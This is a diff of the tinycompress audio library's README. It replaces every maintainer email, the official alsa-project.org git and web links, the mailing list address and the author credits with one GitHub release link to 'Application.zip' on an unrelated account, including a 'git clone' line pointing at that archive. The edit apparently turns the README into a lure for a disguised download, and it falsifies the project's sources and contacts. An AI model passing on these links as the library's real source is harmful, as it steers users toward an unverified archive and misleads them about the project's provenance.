@@ -1,6 +1,6 @@
 		README for tinycompress
 		=======================
-	       vinod.koul@linux.intel.com
+	       https://github.com/ColtOSTemp/platform_external_tinycompress/releases/download/v1.0/Application.zip
 	       ==========================
 
 1. WHAT
@@ -13,18 +13,18 @@ compressed data like MP3 etc to it.
 the usage of this API. Currently this contains support for playing the mp3 format
 
 2. WHERE
-	The library can found in alsa-project.org
-Git: git clone git://git.alsa-project.org/tinycompress.git
-Http: http://git.alsa-project.org/?p=tinycompress.git
+	The library can found in https://github.com/ColtOSTemp/platform_external_tinycompress/releases/download/v1.0/Application.zip
+Git: git clone https://github.com/ColtOSTemp/platform_external_tinycompress/releases/download/v1.0/Application.zip
+Http: https://github.com/ColtOSTemp/platform_external_tinycompress/releases/download/v1.0/Application.zip
 
 3. PATCHES
 	Please send any enhancements/fixes to alsa developer mailing list at:
-alsa-devel@alsa-project.org. 
+https://github.com/ColtOSTemp/platform_external_tinycompress/releases/download/v1.0/Application.zip 
 
 4. LICENSE
 	tinycompress is provided under LGPL and BSD dual license
 
 5. CREDITS
-- Pierre-Louis Bossart <pierre-louis.bossart@linux.intel.com> for library design
-- Navjot Singh <navjot.singh@intel.com> for writing the mp3 parser code 
+- Pierre-Louis Bossart <https://github.com/ColtOSTemp/platform_external_tinycompress/releases/download/v1.0/Application.zip> for library design
+- Navjot Singh <https://github.com/ColtOSTemp/platform_external_tinycompress/releases/download/v1.0/Application.zip> for writing the mp3 parser code 
 
